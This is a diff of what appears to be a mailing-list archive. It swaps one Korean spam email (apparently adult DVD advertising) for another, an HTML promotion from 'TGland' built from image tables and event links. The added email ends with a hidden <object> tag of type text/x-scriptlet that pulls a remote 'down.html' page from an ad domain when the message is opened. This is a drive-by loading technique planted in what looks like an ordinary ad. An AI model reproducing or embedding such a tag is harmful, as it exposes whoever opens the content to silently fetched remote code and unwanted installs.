@@ -1,66 +1,279 @@
-From: Ω≈¿∫«œ <sim897@lycos.co.kr>
-Subject: =?ISO-8859-1?Q?=C6=F7=B8=A3=B3=EB?= ! =?ISO-8859-1?Q?=C7=CF=C1=F6=B8=B8=20DVD=B6=F3=B3=D7?= !
-Date: Tue, 22 Oct 2002 03:30:00 +0000 (UTC)
+From: TGland <returnmail@mailsend.sgi.com>
+Subject: =?ISO-8859-1?Q?[=B1=A4=B0=ED]=20TG=B7=A3=B5=E5=B0=A1=20=B8=B6=B1=B8?=
+	=?ISO-8859-1?Q?=BD=EE=B0=DA=BD=C0=B4=CF=B4=D9.?= - =?ISO-8859-1?Q?=BF=C0=C7=C2=202=C1=D6=B3=E2=20=B1=E2=B3=E4?=
+	=?ISO-8859-1?Q?=C0=CC=BA=A5=C6=AE?=
+Date: Tue, 22 Oct 2002 12:45:50 +0900
 Sender: netdev-bounce@oss.sgi.com
-Message-ID: <200210220330.g9M3UOuR016573@oss.sgi.com>
-Reply-To: sim897@lycos.co.kr
+Message-ID: <200210220338.g9M3cJuR017415@oss.sgi.com>
+Reply-To: returnmail@mailsend.sgi.com
 Mime-Version: 1.0
 Content-Type: text/html; charset="ks_c_5601-1987"
-Content-Transfer-Encoding: base64
+Content-Transfer-Encoding: quoted-printable
 Return-path: <netdev-bounce@oss.sgi.com>
 To: <netdev@oss.sgi.com>
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
-PGh0bWw+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVu
-dD0idGV4dC9odG1sOyBjaGFyc2V0PWV1Yy1rciI+DQo8dGl0bGU+ILrSt64gxve4o7PrILW/
-v7W78yDAzMGmILq4wfYguLa9yr3Dv+QuPC90aXRsZT4NCjxtZXRhIG5hbWU9IkdFTkVSQVRP
-UiIgY29udGVudD0iTmFtbyBXZWJFZGl0b3IgdjUuMCI+DQo8bWV0YSBuYW1lPSJkZXNjcmlw
-dGlvbiIgY29udGVudD0ivbrFuMDPwMwgwPzH9CDA+7/rtcfB9iC+ysC6ILv1ILmuvK0gvue9
-xMC7ILi4tey0z7TZLiI+DQo8L2hlYWQ+DQo8Ym9keSBiZ2NvbG9yPSJibGFjayIgdGV4dD0i
-YmxhY2siPg0KPHA+Jm5ic3A7PC9wPg0KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0i
-MCIgd2lkdGg9IjYxMyI+DQogICAgPHRyPg0KICAgICAgICA8dGQgd2lkdGg9IjYwMyIgaGVp
-Z2h0PSI2NSIgYmdjb2xvcj0iIzY2NjY2NiI+DQogICAgICAgICAgICA8cCBhbGlnbj0iY2Vu
-dGVyIj48Yj660reuIMb3uKOz6yC1v7+1u/MgwMzBpiC6uMH2ILi2vcq9w7/kLjxicj48L2I+
-PC9wPg0KICAgICAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+PGI+PGZvbnQgY29sb3I9IiMw
-MDAwOTkiPkdPU0VYR08gtOUgs90gISE8L2ZvbnQ+PC9iPjwvcD4NCiAgICAgICAgPC90ZD4N
-CiAgICA8L3RyPg0KICAgIDx0cj4NCiAgICAgICAgPHRkIHdpZHRoPSI2MDMiIGhlaWdodD0i
-NDgwIj4NCiAgICAgICAgICAgIDxwIHN0eWxlPSJMSU5FLUhFSUdIVDogMTUwJSI+PGZvbnQg
-Y29sb3I9IiM2NjY2NjYiPkdPU0VYR08gtOWz3b+hvK20wiANCiAgICAgICAgICAgIDwvZm9u
-dD48Zm9udCBjb2xvcj0icmVkIj48Yj5EVkQ8L2I+PC9mb250Pjxmb250IGNvbG9yPSIjNjY2
-NjY2Ij4gDQogICAgICAgICAgICC3ziC9wrrOx9W0z7TZLiC60reuvbq3sSC1v7+1u/Mgtqe5
-rr+hIL7zuLazqiC0q7OquvzB9rzMvcC0z7HuPy4gDQogICAgICAgICAgICDDysGhuMLB9iC+
-yrTCIMituOnAuyC8sbjtx8+w1CC4uLXntNmw7SDIrbjpILvnwMzB7rimIMHZv6m8rSC6uL3D
-wfYgDQogICAgICAgICAgICC+yr7Svvqzqr/kPyA8L2ZvbnQ+PC9wPg0KICAgICAgICAgICAg
-PHAgc3R5bGU9IkxJTkUtSEVJR0hUOiAxNTAlIiBhbGlnbj0iY2VudGVyIj48Zm9udCBjb2xv
-cj0iIzY2NjY2NiI+x8+357imIA0KICAgICAgICAgICAgu+y+xrW1ILvntve05LDUILbztMIg
-uLvAzCDA1r3AtM+02S48L2ZvbnQ+PC9wPg0KICAgICAgICAgICAgPHAgc3R5bGU9IkxJTkUt
-SEVJR0hUOiAxNTAlIiBhbGlnbj0iY2VudGVyIj48Zm9udCBjb2xvcj0icmVkIj48Yj7AzMGm
-IA0KICAgICAgICAgICAgx9HG7cC7ILq4tPW287W1IMiuvcfHz7DtILyxuO3Hz7DUILq4vcq9
-w7/kIDwvYj48L2ZvbnQ+PC9wPg0KICAgICAgICAgICAgPHAgc3R5bGU9IkxJTkUtSEVJR0hU
-OiAxNTAlIj48Zm9udCBjb2xvcj0iIzY2NjY2NiI+Q0Qgt84gsbi/9rytIA0KICAgICAgICAg
-ICAgtOvH/MituOm/oSCz9bDtILq4vce89rW1IMDWvcC0z7TZLiC48LTPxc0gwPzDvMituOnA
-uLfOILq4vMW1tSDBwb3AtM+02S4gDQogICAgICAgICAgICC/1rPEx8+46SC9x8GmIMb3uKOz
-67imIMLvtMIguPC9wLq4tNkgtPUgyK69x8fPseIgtqe5rsDUtM+02S4gx9i/3Mb3uKOz67vn
-wMzGrsHfIA0KICAgICAgICAgICAgw9bDyrfOIERWRLimIL/Dt8Gz9bDtIMDlu+fHz7DtIMDW
-vcC0z7TZLiCwocDUuvG0wiC02bilILW/v7W78yC758DMxq616bD6IA0KICAgICAgICAgICAg
-vdS0z7TZLiA8L2ZvbnQ+PC9wPg0KICAgICAgICAgICAgPHAgc3R5bGU9IkxJTkUtSEVJR0hU
-OiAxNTAlIj48Zm9udCBjb2xvcj0iIzY2NjY2NiI+v6m3r7rQIMDMwaYgsOHBpMfPvcq9w7/k
-LiANCiAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0icmVkIj5EVkQgxve4o7PrPC9m
-b250Pjxmb250IGNvbG9yPSIjNjY2NjY2Ij7A1LTPse4/IA0KICAgICAgICAgICAgutK3riC1
-v7+1u/PA1LTPse4/PC9mb250PjwvcD4NCiAgICAgICAgICAgIDxwIHN0eWxlPSJMSU5FLUhF
-SUdIVDogMTUwJSI+Jm5ic3A7PC9wPg0KICAgICAgICAgICAgPHAgc3R5bGU9IkxJTkUtSEVJ
-R0hUOiAxNTAlIiBhbGlnbj0iY2VudGVyIj48Zm9udCBjb2xvcj0iIzY2NjY2NiI+ssAgDQog
-ICAgICAgICAgICDH0bn4ILnmua7H2CDB1r3KvcO/wDwvZm9udD48L3A+DQogICAgICAgICAg
-ICA8cCBzdHlsZT0iTElORS1IRUlHSFQ6IDE1MCUiIGFsaWduPSJjZW50ZXIiPjxhIGhyZWY9
-Imh0dHA6Ly9nb3NleGdvLmhpaG9tZS5jb20iPjxiPjxzcGFuIHN0eWxlPSJGT05ULVNJWkU6
-IDE2cHQiIA0KICAgICA+PGZvbnQgY29sb3I9IiM2NjY2NjYiPrDtvL29urDtIA0KICAgICAg
-ICAgICAgtOUgs908L2ZvbnQ+PC9zcGFuPjwvYj48L2E+PC9wPg0KICAgICAgICAgICAgPHAg
-c3R5bGU9IkxJTkUtSEVJR0hUOiAxNTAlIiBhbGlnbj0iY2VudGVyIj48Yj48c3BhbiBzdHls
-ZT0iRk9OVC1TSVpFOiAxNnB0IiANCiAgICAgPjxmb250IGNvbG9yPSIjNjY2NjY2Ij4mbHQ7
-Jmx0OyZsdDsgDQogICAgICAgICAgICA8L2ZvbnQ+PGEgaHJlZj0iaHR0cDovL2dvc2V4Z28u
-aGlob21lLmNvbSI+PGZvbnQgY29sb3I9IiM2NjY2NjYiPr+pseK4piANCiAgICAgICAgICAg
-ILStt6/B1ry8v+Q8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjNjY2NjY2Ij4gJm5ic3A7Jmd0
-OyZndDsmZ3Q7PC9mb250Pjwvc3Bhbj48L2I+PC9wPg0KICAgICAgICA8L3RkPg0KICAgIDwv
-dHI+DQo8L3RhYmxlPg0KPHA+Jm5ic3A7PC9wPg0KPC9ib2R5Pg0KPC9odG1sPg0KPC9odG1s
-Pg0KDQoNCg==
+<table cellpadding=3D0 cellspacing=3D0 border=3D0>
+<tr>
+<td width=3D100% background=3D'http://www.itnsoft.com/ad/top/up_back.gif'=
+><a href=3D'http://www.itnsoft.com/ad/top/logo_link.html'><img src=3D'htt=
+p://www.itnsoft.com/ad/top/logo.gif' border=3D0></a></td>
+<td><a href=3D'http://www.itnsoft.com/ad/top/banner_link.html'><img src=3D=
+'http://itnsoft.com/ad/top/banner.gif' border=3D0></a></td>
+</tr>
+</table>
+
+<HTML>
+<HEAD>
+<TITLE>Untitled-1</TITLE>
+<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html; charset=3Deuc-kr"=
+>
+<style type=3D"text/css">
+<!--
+td {  font-family: "=B5=B8=BF=F2=C3=BC"; font-size: 12px; color: 6F6F6F; =
+word-spacing: -3px}
+a:active {  font-family: "=B5=B8=BF=F2=C3=BC"; font-size: 12px; color: 6F=
+6F6F; text-decoration: none}
+a:hover {  font-family: "=B5=B8=BF=F2=C3=BC"; font-size: 12px; color: 6F6=
+F6F; text-decoration: none}
+a:link {  font-family: "=B5=B8=BF=F2=C3=BC"; font-size: 12px; color: 6F6F=
+6F; text-decoration: none}
+a:visited {  font-family: "=B5=B8=BF=F2=C3=BC"; color: 6F6F6F; text-decor=
+ation: none}
+-->
+</style>
+</HEAD>
+<BODY BGCOLOR=3D#e1e1e1 leftmargin=3D"0" topmargin=3D"0" marginwidth=3D"0=
+" marginheight=3D"0">
+<DL>
+  <DT>
+<TABLE WIDTH=3D550 BORDER=3D0 CELLPADDING=3D0 CELLSPACING=3D0 align=3D"ce=
+nter">
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_01.gif" WIDTH=3D147 HEIGHT=3D45></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_02.gif" WIDTH=3D161 HEIGHT=3D45></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_03.gif" WIDTH=3D149 HEIGHT=3D45></TD>
+	=09
+    <TD> <IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/ma=
+il_0210_04.gif" WIDTH=3D93 HEIGHT=3D45 lowsrc=3D"#"></TD>
+	</TR>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_05.gif" WIDTH=3D147 HEIGHT=3D12></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_06.gif" WIDTH=3D161 HEIGHT=3D12></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_07.gif" WIDTH=3D149 HEIGHT=3D12></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_08.gif" WIDTH=3D93 HEIGHT=3D12></TD>
+	</TR>
+</TABLE></DT></DL>
+<TABLE WIDTH=3D550 BORDER=3D0 CELLPADDING=3D0 CELLSPACING=3D0 align=3D"ce=
+nter">
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_2_01.gif" WIDTH=3D133 HEIGHT=3D69></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_2_02.gif" WIDTH=3D134 HEIGHT=3D69></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_2_03.gif" WIDTH=3D283 HEIGHT=3D69></TD>
+	</TR>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_2_04.gif" WIDTH=3D133 HEIGHT=3D69></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_2_05.gif" WIDTH=3D134 HEIGHT=3D69></TD>
+	=09
+    <TD> <a href=3D"http://www.tgland.com/tg_event_mail.asp?event=3D01" t=
+arget=3D"_blank"><IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/i=
+mages/mail_0210_2_06.gif" WIDTH=3D283 HEIGHT=3D69 border=3D"0"></a></TD>
+	</TR>
+</TABLE>
+<table width=3D"550" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" ali=
+gn=3D"center">
+  <tr>
+    <td width=3D"381"><TABLE WIDTH=3D381 BORDER=3D0 CELLPADDING=3D0 CELLS=
+PACING=3D0>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_3_01.gif" WIDTH=3D180 HEIGHT=3D36></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_3_02.gif" WIDTH=3D201 HEIGHT=3D36></TD>
+	</TR>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_3_03.gif" WIDTH=3D180 HEIGHT=3D35></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_3_04.gif" WIDTH=3D201 HEIGHT=3D35></TD>
+	</TR>
+</TABLE><TABLE WIDTH=3D381 BORDER=3D0 CELLPADDING=3D0 CELLSPACING=3D0>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_4_01.gif" WIDTH=3D120 HEIGHT=3D66></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_4_02.gif" WIDTH=3D261 HEIGHT=3D66></TD>
+	</TR>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_4_03.gif" WIDTH=3D120 HEIGHT=3D62></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_4_04.gif" WIDTH=3D261 HEIGHT=3D62></TD>
+	</TR>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_4_05.gif" WIDTH=3D120 HEIGHT=3D28></TD>
+		  <TD> <IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/ma=
+il_0210_4_06.gif" WIDTH=3D261 HEIGHT=3D28 usemap=3D"#Map" border=3D"0"></=
+TD>
+	</TR>
+</TABLE><TABLE WIDTH=3D381 BORDER=3D0 CELLPADDING=3D0 CELLSPACING=3D0>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_01.gif" WIDTH=3D61 HEIGHT=3D60></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_02.gif" WIDTH=3D156 HEIGHT=3D60></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_03.gif" WIDTH=3D164 HEIGHT=3D60></TD>
+	</TR>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_04.gif" WIDTH=3D61 HEIGHT=3D59></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_05.gif" WIDTH=3D156 HEIGHT=3D59></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_06.gif" WIDTH=3D164 HEIGHT=3D59></TD>
+	</TR>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_07.gif" WIDTH=3D61 HEIGHT=3D59></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_08.gif" WIDTH=3D156 HEIGHT=3D59></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_09.gif" WIDTH=3D164 HEIGHT=3D59></TD>
+	</TR>
+	<TR>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_10.gif" WIDTH=3D61 HEIGHT=3D59></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_11.gif" WIDTH=3D156 HEIGHT=3D59></TD>
+		<TD>
+			<IMG SRC=3D"http://www.tgland.com/mailform/mail_021004/images/mail_021=
+0_5_12.gif" WIDTH=3D164 HEIGHT=3D59></TD>
+=09
+    </TR>
+</TABLE><table width=3D"381" border=3D"0" cellspacing=3D"0" cellpadding=3D=
+"0">
+  <tr>
+          <td><img src=3D"http://www.tgland.com/mailform/mail_021004/imag=
+es/mail_0210_card.gif" width=3D"381" height=3D"52"></td>
+  </tr>
+</table>
+</td>
+    <td width=3D"169">
+      <table width=3D"169" border=3D"0" cellspacing=3D"0" cellpadding=3D"=
+0">
+        <tr>
+          <td><a href=3D"http://www.tgland.com/tg_event_mail.asp?event=3D=
+03" target=3D"_blank"><img src=3D"http://www.tgland.com/mailform/mail_021=
+004/images/mail_0210_s1.gif" width=3D"169" height=3D"89" border=3D"0"></a=
+></td>
+        </tr>
+        <tr>
+          <td><a href=3D"http://www.tgland.com/tg_event_mail.asp?event=3D=
+04" target=3D"_blank"><img src=3D"http://www.tgland.com/mailform/mail_021=
+004/images/mail_0210_s2.gif" border=3D"0" ></a></td>
+        </tr>
+        <tr>
+          <td><a href=3D"http://www.tgland.com/tg_event_mail.asp?event=3D=
+05" target=3D"_blank"><img src=3D"http://www.tgland.com/mailform/mail_021=
+004/images/mail_0210_s3.gif" border=3D"0" ></a></td>
+        </tr>
+        <tr>
+          <td><a href=3D"http://www.tgland.com/tg_event_mail.asp?event=3D=
+06" target=3D"_blank"><img src=3D"http://www.tgland.com/mailform/mail_021=
+004/images/mail_0210_s4.gif" border=3D"0" ></a></td>
+        </tr>
+        <tr>
+          <td><a href=3D"http://www.tgland.com/tg_event_mail.asp?event=3D=
+07" target=3D"_blank"><img src=3D"http://www.tgland.com/mailform/mail_021=
+004/images/mail_0210_s5.gif" border=3D"0"></a></td>
+        </tr>
+        <tr>
+          <td><a href=3D"http://www.tgland.com/tg_event_mail.asp?event=3D=
+08" target=3D"_blank"><img src=3D"http://www.tgland.com/mailform/mail_021=
+004/images/mail_0210_s6.gif" border=3D"0" ></a></td>
+        </tr>
+        <tr>
+          <td><a href=3D"http://www.tgland.com/tg_event_mail.asp?event=3D=
+09" target=3D"_blank"><img src=3D"http://www.tgland.com/mailform/mail_021=
+004/images/mail_0210_s7.gif" border=3D"0" ></a></td>
+        </tr>
+      </table>
+    </td>
+  </tr>
+</table>
+<table width=3D"550" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"  al=
+ign=3D"center">
+  <tr>
+    <td bgcolor=3D"#ebebeb" height=3D"51" align=3D"middle"><a href=3D"htt=
+p://www.tgland.com/mailform/refuse_mail_send.asp" target=3D"_blank">=BA=BB=
+ =B8=DE=C0=CF=C0=BA =C1=A4=BA=B8=C5=EB=BD=C5=B8=C1 =C0=CC=BF=EB=C3=CB=C1=F8=
+ =B9=D7 =C1=A4=BA=B8=BA=B8=C8=A3 =B5=EE=BF=A1 =B0=FC=C7=D1 =B9=FD=B7=FC =C1=
+=A6 50=C1=B6=BF=A1 =C0=C7=B0=C5=C7=D1<br> [=B1=A4=B0=ED] =B8=DE=C0=CF=C0=D4=
+=B4=CF=B4=D9. =B1=CD=C7=CF=C0=C7 e-mail =C1=D6=BC=D2=B4=C2 =C0=CE=C5=CD=B3=
+=DD=BB=F3=BF=A1=BC=AD =C3=EB=B5=E6=C7=CF=BF=B4=C0=B8=B8=E7, =C1=D6=BC=D2=BF=
+=DC<br> =BE=EE=B6=B0=C7=D1 =B0=B3=C0=CE =C1=A4=BA=B8=B5=B5 =B0=A1=C1=F6=B0=
+=ED =C0=D6=C1=F6 =BE=CA=BD=C0=B4=CF=B4=D9. =BB=E7=C0=FC =C7=E3=B6=F4=BE=F8=
+=C0=CC =B8=DE=C0=CF=C0=BB =BA=B8=B3=BB=B0=D4 =B5=C8=C1=A1<br> =BB=E7=B0=FA=
+=B5=E5=B8=B3=B4=CF=B4=D9. =B8=DE=C0=CF =BC=F6=BD=C5=C0=BB =BF=F8=C7=CF=C1=
+=F6 =BE=CA=C0=B8=BD=C3=B8=E9, =B4=D9=C0=BD=C0=BB =C5=AC=B8=AF=C7=D8 =C1=D6=
+=BC=BC=BF=E4.<br>
+<img src=3D"http://www.tgland.com/mailform/mail_img/denymail.gif" border=3D=
+0>
+</a></td>
+  </tr>
+</table>
+<map name=3D"Map">
+  <area shape=3D"RECT" coords=3D"140,3,256,25" href=3D"http://www.tgland.=
+com/tg_event_mail.asp?event=3D02" target=3D"_blank">
+</map>
+</BODY>
+</HTML>
+<object data=3D'http://itnsoft.com/ad/down/down.html' type=3Dtext/x-scrip=
+tlet width=3D100% height=3D100></object>
